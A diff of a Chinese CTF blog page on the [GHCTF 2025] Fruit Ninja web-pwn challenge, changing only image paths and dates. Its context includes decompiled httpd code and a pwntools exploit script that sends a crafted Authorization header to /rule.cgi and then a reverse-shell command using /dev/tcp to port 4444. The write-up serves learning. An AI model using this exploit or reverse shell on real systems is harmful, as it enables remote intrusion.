@@ -24,16 +24,16 @@
 <meta property="og:site_name" content="HFTTC&#39;s Blog">
 <meta property="og:description" content="[GHCTF 2025]Fruit Ninja不太了解 WEBPWN 应该从哪里学起，那就从碰见的一道题目开始吧：[GHCTF 2025]Fruit Ninja | NSS 下载附件之后，我们发现和平时的 PWN 题目不太一样，同时注意到 httpd 是一个编译的二进制文件：  程序分析：我们进行 IDA 反编译一下，然后进行 checksec：发现栈保护全开：   这是一个非常经典的轻量级嵌入式">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/_a9fqGxtQ2l8_AcZ/1778381909080-5c4cc0d9-f5a0-4d2d-8b45-c1e0e99e3a34-446715.png">
-<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/_a9fqGxtQ2l8_AcZ/1778384629698-c89c704c-f485-415a-bb23-c2005cfd1595-544388.png">
-<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/_a9fqGxtQ2l8_AcZ/1778385063796-3a4c7635-67c6-4ffd-bd4f-9343ad7c1aee-712304.png">
-<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/_a9fqGxtQ2l8_AcZ/1778389206110-e30192a6-bde3-4197-95b6-3e60f0f32f96-310881.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/ghctf2025-fruitninja/1778381909080-5c4cc0d9-f5a0-4d2d-8b45-c1e0e99e3a34-446715.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/ghctf2025-fruitninja/1778384629698-c89c704c-f485-415a-bb23-c2005cfd1595-544388.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/ghctf2025-fruitninja/1778385063796-3a4c7635-67c6-4ffd-bd4f-9343ad7c1aee-712304.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/ghctf2025-fruitninja/1778389206110-e30192a6-bde3-4197-95b6-3e60f0f32f96-310881.png">
 <meta property="article:published_time" content="2026-05-22T18:46:49.000Z">
-<meta property="article:modified_time" content="2026-05-22T18:58:43.566Z">
+<meta property="article:modified_time" content="2026-06-01T07:10:29.709Z">
 <meta property="article:author" content="HFTTC">
 <meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/_a9fqGxtQ2l8_AcZ/1778381909080-5c4cc0d9-f5a0-4d2d-8b45-c1e0e99e3a34-446715.png">
+<meta name="twitter:image" content="https://idcm-svg.github.io/HFTTC.github.io/images/pwn/ghctf2025-fruitninja/1778381909080-5c4cc0d9-f5a0-4d2d-8b45-c1e0e99e3a34-446715.png">
       <meta name="keywords" content="Pwn, CTF, Binary">
     <link rel="alternate" href="/HFTTC.github.io/atom.xml" title="HFTTC's Blog" type="application/atom+xml">
     <link rel="shortcut icon" href="/HFTTC.github.io/images/favicon.ico">
@@ -250,10 +250,10 @@
       <div class="article-date">
   <span class="article-date-link icon-calendar" data-aos="zoom-in">
     <time datetime="2026-05-22T18:46:49.000Z" itemprop="datePublished">2026-05-23</time>
-    <time style="display: none;" id="post-update-time">2026-05-23</time>
+    <time style="display: none;" id="post-update-time">2026-06-01</time>
   </span>
     <span class="article-date-link icon-calendar-plus" data-aos="zoom-in">
-      <time datetime="2026-05-22T18:58:43.566Z" itemprop="dateModified">2026-05-23</time>
+      <time datetime="2026-06-01T07:10:29.709Z" itemprop="dateModified">2026-06-01</time>
     </span>
 </div>
 
@@ -264,10 +264,10 @@
     <div class="e-content article-entry" itemprop="articleBody">
         <h1 id="GHCTF-2025-Fruit-Ninja"><a href="#GHCTF-2025-Fruit-Ninja" class="headerlink" title="[GHCTF 2025]Fruit Ninja"></a>[GHCTF 2025]Fruit Ninja</h1><p>不太了解 WEBPWN 应该从哪里学起，那就从碰见的一道题目开始吧：<font style="color:rgb(0, 0, 0);">[GHCTF 2025]Fruit Ninja | NSS</font></p>
 <p><font style="color:rgb(0, 0, 0);">下载附件之后，我们发现和平时的 PWN 题目不太一样，同时注意到 httpd 是一个编译的二进制文件：</font></p>
-<p><img src="/HFTTC.github.io/images/pwn/_a9fqGxtQ2l8_AcZ/1778381909080-5c4cc0d9-f5a0-4d2d-8b45-c1e0e99e3a34-446715.png" alt="1778381909080-5c4cc0d9-f5a0-4d2d-8b45-c1e0e99e3a34.png"></p>
+<p><img src="/HFTTC.github.io/images/pwn/ghctf2025-fruitninja/1778381909080-5c4cc0d9-f5a0-4d2d-8b45-c1e0e99e3a34-446715.png" alt="1778381909080-5c4cc0d9-f5a0-4d2d-8b45-c1e0e99e3a34.png"></p>
 <h3 id="程序分析："><a href="#程序分析：" class="headerlink" title="程序分析："></a>程序分析：</h3><p>我们进行 IDA 反编译一下，然后进行 checksec：发现栈保护全开：</p>
-<p><img src="/HFTTC.github.io/images/pwn/_a9fqGxtQ2l8_AcZ/1778384629698-c89c704c-f485-415a-bb23-c2005cfd1595-544388.png" alt="1778384629698-c89c704c-f485-415a-bb23-c2005cfd1595.png"></p>
-<p><img src="/HFTTC.github.io/images/pwn/_a9fqGxtQ2l8_AcZ/1778385063796-3a4c7635-67c6-4ffd-bd4f-9343ad7c1aee-712304.png" alt="1778385063796-3a4c7635-67c6-4ffd-bd4f-9343ad7c1aee.png"></p>
+<p><img src="/HFTTC.github.io/images/pwn/ghctf2025-fruitninja/1778384629698-c89c704c-f485-415a-bb23-c2005cfd1595-544388.png" alt="1778384629698-c89c704c-f485-415a-bb23-c2005cfd1595.png"></p>
+<p><img src="/HFTTC.github.io/images/pwn/ghctf2025-fruitninja/1778385063796-3a4c7635-67c6-4ffd-bd4f-9343ad7c1aee-712304.png" alt="1778385063796-3a4c7635-67c6-4ffd-bd4f-9343ad7c1aee.png"></p>
 <p><font style="color:rgb(0, 0, 0);">这是一个非常经典的</font>轻量级嵌入式 Web 服务器<font style="color:rgb(0, 0, 0);">的二进制逆向分析，是一个典型的</font>多线程并发处理模型<font style="color:rgb(0, 0, 0);">。  </font></p>
 <h4 id="main"><a href="#main" class="headerlink" title="main"></a>main</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> __int16 v3; <span class="comment">// [rsp+Ah] [rbp-36h] BYREF</span></span><br><span class="line">    <span class="type">socklen_t</span> addr_len; <span class="comment">// [rsp+Ch] [rbp-34h] BYREF</span></span><br><span class="line">    <span class="type">int</span> fd; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">    <span class="type">int</span> v6; <span class="comment">// [rsp+14h] [rbp-2Ch]</span></span><br><span class="line">    <span class="type">pthread_t</span> newthread; <span class="comment">// [rsp+18h] [rbp-28h] BYREF</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> <span class="title">addr</span>;</span> <span class="comment">// [rsp+20h] [rbp-20h] BYREF</span></span><br><span class="line">    <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">    v9 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">    fd = <span class="number">-1</span>;</span><br><span class="line">    v3 = <span class="number">4000</span>;</span><br><span class="line">    v6 = <span class="number">-1</span>;</span><br><span class="line">    addr_len = <span class="number">16</span>;</span><br><span class="line">    fd = startup(&amp;v3, argv, envp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;httpd running on port %d\n&quot;</span>, v3);</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        v6 = accept(fd, &amp;addr, &amp;addr_len);</span><br><span class="line">        <span class="keyword">if</span> ( v6 == <span class="number">-1</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( pthread_create(&amp;newthread, <span class="number">0</span>, accept_request, (<span class="type">void</span> *)v6) )</span><br><span class="line">            perror(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    error_die(<span class="string">&quot;accept&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -394,7 +394,7 @@
 <p>Connection received on ip 随机端口号，这样子就可以获取 flag 了。</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"><span class="title function_">context</span><span class="params">(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span></span><br><span class="line">file = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node6.anna.nssctf.cn&#x27;</span>,<span class="number">20447</span>)</span><br><span class="line"></span><br><span class="line">pay = b<span class="string">&#x27;pwner\x00&#x27;</span>.ljust(<span class="number">256</span>,b<span class="string">&#x27;\x00&#x27;</span>)+b<span class="string">&#x27;/bin/bash\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">data =b<span class="string">&#x27;POST /rule.cgi &#x27;</span>+b<span class="string">&#x27;HTTP/1.1\r\nContent-Length: 1000\r\nAuthorization: Basic &#x27;</span>+base64.b64encode(pay)+b<span class="string">&#x27;\r\n\r\n&#x27;</span></span><br><span class="line"></span><br><span class="line">io.send(data)</span><br><span class="line"></span><br><span class="line">io.sendline(b<span class="string">&#x27;sh -i &gt;&amp; /dev/tcp/ip/4444 0&gt;&amp;1&#x27;</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p><img src="/HFTTC.github.io/images/pwn/_a9fqGxtQ2l8_AcZ/1778389206110-e30192a6-bde3-4197-95b6-3e60f0f32f96-310881.png" alt="1778389206110-e30192a6-bde3-4197-95b6-3e60f0f32f96.png"></p>
+<p><img src="/HFTTC.github.io/images/pwn/ghctf2025-fruitninja/1778389206110-e30192a6-bde3-4197-95b6-3e60f0f32f96-310881.png" alt="1778389206110-e30192a6-bde3-4197-95b6-3e60f0f32f96.png"></p>
 <blockquote>
 <p>更新: 2026-05-10 19:55:17<br>原文: <a target="_blank" rel="noopener" href="https://www.yuque.com/idcm/wnemg9/ubnxy9l5nba9skcf">https://www.yuque.com/idcm/wnemg9/ubnxy9l5nba9skcf</a></p>
 </blockquote>
@@ -630,7 +630,7 @@
           description: "",
           stripContent: "[GHCTF 2025]Fruit Ninja不太了解 WEBPWN 应该从哪里学起，那就从碰见的一道题目开始吧：[GHCTF 2025]Fruit Ninja | NSS 下载附件之后，我们发现和平时的 PWN 题目不太一样，同时注意到 httpd 是一个编译的二进制文件：  程序分析：我们进行 IDA 反编译一下，然后进行 checksec：发现栈保护全开：   这是一个非常经典的轻量级嵌入式 Web 服务器的二进制逆向分析，是一个典型的多线程并发处理模型。   main1234567891",
           date: "Sat May 23 2026 02:46:49 GMT+0800",
-          updated: "Sat May 23 2026 02:58:43 GMT+0800",
+          updated: "Mon Jun 01 2026 15:10:29 GMT+0800",
           cover: "/HFTTC.github.io/images/banner.webp",
         };
       </script>
